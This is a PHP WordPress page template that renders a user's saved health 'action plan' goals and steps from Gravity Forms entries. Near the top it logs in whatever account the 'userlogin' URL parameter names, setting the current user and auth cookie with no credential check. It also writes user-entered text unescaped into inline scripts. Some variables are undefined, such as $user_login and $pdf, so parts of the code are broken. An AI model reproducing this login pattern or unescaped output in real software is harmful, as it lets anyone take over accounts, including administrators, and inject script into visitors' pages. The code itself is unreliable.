<?php
/*
Template Name: My Action Plan Archive
*/
?>

<style>
.sidebar.left,
#nav-container,
.report-top-right,
.goals-form,
.social,
.gform_page_footer.top_label {
	display: none !important;
}
#tool-container {
	width: 100% !important; 
	float: none !important;
}
.results-table {
	width: 100% !important; 
	margin: 0px !important;
}
#logo-container img { 
	top: 0 !important; 
	margin-left: 10px !important; 
}
#outerwrapper { background-image: none !important; }
#header-wide-container { 
	background-image: none !important; 
	height: 67px !important;
}
#tagline { 
	margin-top: 30px !important; 
	margin-right: 12px !important;
}
.table.table-striped {border-top: 1px solid gray !important;}

#tools-supporting, #resources, #about { width: 100% !important;  }
.action-plan-form_wrapper .gfield.ap-section { max-width: 100% !important;  }

</style>


<?php 
	// get the wp header
	get_header(); 

	// get all of the Advanced Custom Fields for this page	
	$fields = get_fields();
	
	// wordpress URLs
	$template_url = get_bloginfo('template_url');
	$site_url = get_site_url();

	// user info - get userlogin from query string
	$user_login_name = $_GET['userlogin'];

	//set the current user to the user specified in the querystring
	$user = get_user_by('login', $user_login_name);
    $user_id = $user->ID;
    wp_set_current_user($user_id);
    if ( is_wp_error($user) ){
        echo $user->get_error_message();            
    }
    wp_set_auth_cookie( $user_id );
	


	// find GOAL leads for current user
	$goal_leads = RGFormsModel::get_leads( 7 ); // form_id=7 for Action Planning Prep form
	
	// get the form meta for the GOALS AND PLANNING form 
	$form = RGFormsModel::get_form_meta( 7 );
	
	// get the field object with the checkboxed goals
	$goals_field = RGFormsModel::get_field($form, 2);

	// Loop GOALS results and return the 1st lead that matches on user-login
	// This one lead contains all goals 
	$my_goal_lead = null;
	$has_goal_lead = false;
	foreach ($goal_leads as $goal_lead) {
		if($goal_lead['4']==$user_login){
			$my_goal_lead = $goal_lead;
			$has_goal_lead = true;
			break;
		}
	}			

	// Iterate to find which GOALS were checked to show up on the Goals and Planning page
	$goals_list = "<ul>";	
	$my_selected_goal_shortcodes = array();
	$my_selected_goal_names = array();
	for ($i = 1; $i <= 9; $i++) {
		$checkbox_no = "2.$i";
		$title_index = $i-1;
		if ($my_goal_lead[$checkbox_no]) {
			$goal_title = $goals_field["choices"][$title_index]["text"];
			$goals_list .= "<li>".$goal_title."</li>";
			$goal_shortcode = $my_goal_lead[$checkbox_no];
			array_push($my_selected_goal_shortcodes, $goal_shortcode);
			array_push($my_selected_goal_names, $goal_title);
		}
	}
	$goals_list .= "</ul>";

	// map action planning builder forms to their IDs
	$ap_builder_form_ids = array(
		"mod-pa"=>"8",
		"vig-pa"=>"10",
		"no-comp"=>"16",
		"no-tv"=>"17",
		"veg"=>"18",
		"grains"=>"19",
		"no-ssb-int"=>"20",
		"no-ssb-ext"=>"21",
		"water"=>"22");	
	
	// build an array with just the IDs of the selected goals
	$selected_ap_builder_form_ids = array();
	foreach ($my_selected_goal_shortcodes as $selected_goal_shortcode) { 
		foreach ($ap_builder_form_ids as $shortcode => $id) { // ie as key=shortcode and value=id
			if ($shortcode == $selected_goal_shortcode) {
				array_push($selected_ap_builder_form_ids, $id);
			}
		}
	}

	?>
					
	<div id="content" class="row">

		<!-- load the left sidebar widgets -->
		<div class="sidebar left">
		<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Tools Left') ) : ?>    	
			<div class="widget"></div>		
		<?php endif; ?>	
		</div>

		<!-- main content area -->
		<div id="tools-supporting">			
			<div class="results-table">	
			<?php //if ( is_user_logged_in() ) { ?>	
			<?php //if ( !empty($user_login) ) { ?>	

								
				<?php if (strlen($goals_list) < 15 ) { ?>
					<div style="padding: 16px;">
					<h4>No Action Plan found.</h4>
					<br/><br/>
					<p>You must first complete a <a href='<?php echo $site_url ?>/tools/practice-assessment/introduction'>daily practice self-assessment</a> at minimum, then from
					the generated report select up to 5 goals you'd like to work on.</p><br/>
					<p>If you've already completed the daily practice self-assessment, go to 
					<a href='<?php echo $site_url ?>/tools/self-assessment-report/'>The Report</a> now.</p>
				</div>


				<?php } else { ?>


					<div class="report-top">
						<div class="report-top-left">
							<h3><?php echo $fields['ap_title'] ?> <?php echo $user_login; ?></h3>
							<span><b>Generated on: <?php echo date('l, F jS, Y') ?> </b></span>
							<?php echo $fields['ap_text'] ?>
						</div>
						<div class="report-top-right">
							<a href="" onClick="window.print()">
							<img border="0" src="<?php echo $template_url?>/images/print.png" alt="Printer friendly report" width="38" height="38">
							</a>
						</div>
					</div>
					<table class="table table-striped" >
						<thead>
							<tr>
								<td><?php echo $fields['top_c1'] ?></td>
							<tr>
						</thead>
						<tbody>
							<tr>
								<td class="standard"><?php echo $goals_list ?></td>
							</tr>					
						</tbody>
					</table>
					
					<!-- load the form -->
					<?php 
						$formid = '49';
						//echo apply_filters( 'the_content',' [gravityform id='.$formid.' field_values="people=blahblah" single="true"] ');
						echo apply_filters( 'the_content','[gravityform id='.$formid.' single="true"]');
					?>			
					
				<?php } ?>
				
				
	<!-- define jq functions for taking over the forms 'section' fields -->
	<script>
		function fillDiv(id,html) {
			var selector = "#gform_page_49_"+id+" li.gfield.gsection";				
			$(selector).html(html);
		};
		function appendDiv(id,html) {
			var selector = "#gform_page_49_"+id+" li.gfield.gsection";				
			$(selector).append(html);
		};
		function showPage(id) { //page is really just a div showing the fields for a specific step
			var selector = "#gform_page_49_"+id;
			$(selector).show();
		};		
		
		// remove the original input that says go to page 2 (this is done at the end of loop)
		// then append a new 'fake' input
		var form_last_page_selector = '#gform_page_49_32 .gform_page_footer';
		var form_extra_html = '<input type="hidden" class="gform_hidden" name="gform_target_page_number_49" id="gform_target_page_number_49" value="0">';
		$(form_last_page_selector).append(form_extra_html);
		
	</script>
	

	
	<?php

	// init 
	$goal_index = 0;
	$use_this_section_id = 1; 
	
	// loop through each of the selected goal's form IDs
	foreach ($selected_ap_builder_form_ids as $selected_ap_builder_form_id) {
		
		// i need to do some counting here, or rather at the end; 
		// if the number of steps = 0, output a message 
		// and unhide the section and increment use_this_section_id
		$number_of_steps_selected = 0;
		
		// build the div with the goal title
		$goal_text_div = '<div class="report-top">';
		$goal_text_div .= '<h4 class="plan-goal-top">Goal '.($goal_index+1).': '.$my_selected_goal_names[$goal_index].'</h4>';
		$goal_text_div .= '</div>';

		// echo out the javascript needed to fill the 'section' div, and show the page
		echo '<script>fillDiv('.$use_this_section_id.',\''.$goal_text_div.'\');</script>';		
		
		// define steps arrays
		$policy_step_names = array();
		$practice_step_names = array();
		$communication_step_names = array();
		
		// find BUILDER leads for current user
		$builder_leads = RGFormsModel::get_leads( $selected_ap_builder_form_id ); 
		
		// get the form meta for the GOALS AND PLANNING form from ID
		$builder_form_meta = RGFormsModel::get_form_meta( $selected_ap_builder_form_id );
		
		// loop BUILDER results and return the 1st lead that matches on user-login
		$my_builder_lead = null;		
		$user_field_id = get_field_id_by_label('user-login', $builder_form_meta);
	
		foreach ($builder_leads as $builder_lead) {
			if ($builder_lead[$user_field_id] == $user_login){
				$my_builder_lead = $builder_lead;
				break;
			}
		}
		
		// loop all fields
		$am_i_first = true;
		$last_step_in_goal = '';
		
		
		if (is_array($builder_form_meta["fields"])){
			foreach($builder_form_meta["fields"] as $field){
				
				$field_id = $field["id"];
				$checkbox_id = $field_id.".1";				
					
				// POLICY-STEPS
				// get only fields marked 'policy-step' in css
				if (strpos($field['cssClass'], 'policy-step') !== false) {

					// get only fields that were checked off
					if ($my_builder_lead[$checkbox_id]) { // ie if it returns a value
					
						$number_of_steps_selected++;
						
						$step_name = $field["label"];
						$step_description = $field["description"];

						$step_text_div = '<div class="ap-step-container">';
						$step_text_div .= '  <div class="ap-step-name">';
						$step_text_div .= '    <strong>'.$fields['step_type_1'].'</strong>: '.$step_name;
						$step_text_div .= '  </div>';
						$step_text_div .= '  <div class="ap-step-resources">';
						$step_text_div .=      $step_description;
						$step_text_div .= '  </div>';
						$step_text_div .= '</div>';
						
						//// Fill the 'section' div with the step. 
						// If it's the FIRST step for this goal, append, otherwise fill (ie overwrite)
						if ($am_i_first) {
							echo '<script>appendDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						} else {
							echo '<script>fillDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						}
							
						// mark this as the last step... 
						// this parameter will be overwritten by subsequesnt steps, until the last one
							$last_step_in_goal = $use_this_section_id;	
						
						// unhide the 'page' (section of form)
							echo '<script>showPage('.$use_this_section_id.');</script>';
							
						// increment section id
							$use_this_section_id++; 
							
						// since we're at the end of this inner loop, first place has now been taken
							$am_i_first = false; 	
					}

				}
				// Add write in policy step
				if (strpos($field['label'], 'Other Policy Action Steps:') !== false) {
					if (!empty($my_builder_lead[$field_id])) {
						//echo '<h2>write-in: '.$my_builder_lead[$field_id].'</h2>';
						
						$number_of_steps_selected++;
						
						$step_text_div = '<div class="ap-step-container">';
						$step_text_div .= '  <div class="ap-step-name">';
						$step_text_div .= '    <strong>Write-in '.$fields['step_type_1'].'</strong>: '.$my_builder_lead[$field_id];
						$step_text_div .= '  </div>';
						$step_text_div .= '</div>';
						
						//// Fill the 'section' div with the step. 
						// If it's the FIRST step for this goal, append, otherwise fill (ie overwrite)
						if ($am_i_first) {
							echo '<script>appendDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						} else {
							echo '<script>fillDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						}
							
						// mark this as the last step... 
						// this parameter will be overwritten by subsequesnt steps, until the last one
							$last_step_in_goal = $use_this_section_id;
						 
						// unhide the 'page' (section of form)
							echo '<script>showPage('.$use_this_section_id.');</script>';
							
						// increment section id
							$use_this_section_id++; 
							
						// since we're at the end of this inner loop, first place has now been taken
							$am_i_first = false; 
					}
				}

				
				// PRACTICE-STEPS
				// get only fields marked 'practice-step' in css
				if (strpos($field['cssClass'], 'practice-step') !== false) {

					// get only fields that were checked off
					if ($my_builder_lead[$checkbox_id]) { // ie if it returns a value
						
						$number_of_steps_selected++;
						
						$step_name = $field["label"];
						$step_description = $field["description"];

						$step_text_div = '<div class="ap-step-container">';
						$step_text_div .= '  <div class="ap-step-name">';
						$step_text_div .= '    <strong>'.$fields['step_type_2'].'</strong>: '.$step_name;
						$step_text_div .= '  </div>';
						$step_text_div .= '  <div class="ap-step-resources">';
						$step_text_div .=      $step_description;
						$step_text_div .= '  </div>';
						$step_text_div .= '</div>';
						
						//// Fill the 'section' div with the step. 
						// If it's the FIRST step for this goal, append, otherwise fill (ie overwrite)
						if ($am_i_first) {
							echo '<script>appendDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						} else {
							echo '<script>fillDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						}
							
						// mark this as the last step... 
						// this parameter will be overwritten by subsequesnt steps, until the last one
							$last_step_in_goal = $use_this_section_id;
						
						// unhide the 'page' (section of form)
							echo '<script>showPage('.$use_this_section_id.');</script>';
							
						// increment section id
							$use_this_section_id++; 
							
						// since we're at the end of this inner loop, first place has now been taken
							$am_i_first = false; 
					}
				}
				// Add write in practice step
				if (strpos($field['label'], 'Other Practice Action Steps:') !== false) {
					if (!empty($my_builder_lead[$field_id])) {
						
						$number_of_steps_selected++;
						
						$step_text_div = '<div class="ap-step-container">';
						$step_text_div .= '  <div class="ap-step-name">';
						$step_text_div .= '    <strong>Write-in '.$fields['step_type_2'].'</strong>: '.$my_builder_lead[$field_id];
						$step_text_div .= '  </div>';
						$step_text_div .= '</div>';
						
						//// Fill the 'section' div with the step. 
						// If it's the FIRST step for this goal, append, otherwise fill (ie overwrite)
						if ($am_i_first) {
							echo '<script>appendDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						} else {
							echo '<script>fillDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						}
							
						// mark this as the last step... 
						// this parameter will be overwritten by subsequesnt steps, until the last one
							$last_step_in_goal = $use_this_section_id;
						 
						// unhide the 'page' (section of form)
							echo '<script>showPage('.$use_this_section_id.');</script>';
							
						// increment section id
							$use_this_section_id++; 
							
						// since we're at the end of this inner loop, first place has now been taken
							$am_i_first = false; 
					}
				}
				
				
				// COMMUNICATION-STEPS
				// get only fields marked 'communication-step' in css
				if (strpos($field['cssClass'], 'communication-step') !== false) {

					// get only fields that were checked off
					if ($my_builder_lead[$checkbox_id]) { // ie if it returns a value
						
						$number_of_steps_selected++;
						
						$step_name = $field["label"];
						$step_description = $field["description"];

						$step_text_div = '<div class="ap-step-container">';
						$step_text_div .= '  <div class="ap-step-name">';
						$step_text_div .= '    <strong>'.$fields['step_type_3'].'</strong>: '.$step_name;
						$step_text_div .= '  </div>';
						$step_text_div .= '  <div class="ap-step-resources">';
						$step_text_div .=      $step_description;
						$step_text_div .= '  </div>';
						$step_text_div .= '</div>';
						
						//// Fill the 'section' div with the step. 
						// If it's the FIRST step for this goal, append, otherwise fill (ie overwrite)
						if ($am_i_first) {
							echo '<script>appendDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						} else {
							echo '<script>fillDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						}
							
						// mark this as the last step... 
						// this parameter will be overwritten by subsequesnt steps, until the last one
							$last_step_in_goal = $use_this_section_id;
						
						// unhide the 'page' (section of form)
							echo '<script>showPage('.$use_this_section_id.');</script>';
							
						// increment section id
							$use_this_section_id++; 
							
						// since we're at the end of this inner loop, first place has now been taken
							$am_i_first = false; 
					}
				}
				// Add write in Communication step
				if (strpos($field['label'], 'Other Communication Action Steps:') !== false) {
					if (!empty($my_builder_lead[$field_id])) {
						//echo '<h2>write-in: '.$my_builder_lead[$field_id].'</h2>';
						
						$number_of_steps_selected++;
						
						$step_text_div = '<div class="ap-step-container">';
						$step_text_div .= '  <div class="ap-step-name">';
						$step_text_div .= '    <strong>Write-in '.$fields['step_type_3'].'</strong>: '.$my_builder_lead[$field_id];
						$step_text_div .= '  </div>';
						$step_text_div .= '</div>';
						
						//// Fill the 'section' div with the step. 
						// If it's the FIRST step for this goal, append, otherwise fill (ie overwrite)
						if ($am_i_first) {
							echo '<script>appendDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						} else {
							echo '<script>fillDiv('.$use_this_section_id.',\''.$step_text_div.'\');</script>';
						}
							
						// mark this as the last step... 
						// this parameter will be overwritten by subsequesnt steps, until the last one
							$last_step_in_goal = $use_this_section_id;
						 
						// unhide the 'page' (section of form)
							echo '<script>showPage('.$use_this_section_id.');</script>';
							
						// increment section id
							$use_this_section_id++; 
							
						// since we're at the end of this inner loop, first place has now been taken
							$am_i_first = false; 
					}
				}
				
			}	
		}
		
		// end of goal
		
		// clone the 'barrier' pages into a div after the last step of each goal		
		$last_step_index = $goal_index + 27; // last step fields are field_ids 27..31
		$last_step_selector = '#gform_page_49_'.$last_step_in_goal;
		$thing_to_clone = '#gform_page_49_'.$last_step_index.' .gform_page_fields';
		echo '<script>$(\''.$thing_to_clone.'\').clone().appendTo(\''.$last_step_selector.'\');</script>';
		
		
		// end looping each goal
		$goal_index++;
		
		
		// if the number of steps = 0, output a message 
		// and unhide the section and increment use_this_section_id
		if ($number_of_steps_selected == 0){
			//echo '<script>showPage('.$use_this_section_id.');</script>';
			$use_this_section_id++;
		}
	}
	
	// remove the original barriers-pages 
	echo '<script>$(\'.barriers-page\').remove();</script>';

?>


		<?php //} else {	?>		
		<!--
			<p>&nbsp;</p>
			<h4>Please log in using the menu on the left.</h4>
			<p class="no-login-sub">If you do not yet have a login account, create one using the tab labeled 'register'.</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
		-->		
		<?php //} ?>	
		
		</div>
	</div>
</div>

<?php
	// Save the PDF
	$pdf->saveAs('wp-content/themes/osnap.1.0/report-archives/TEST_1213013.pdf');
?>

<?php get_footer(); ?>



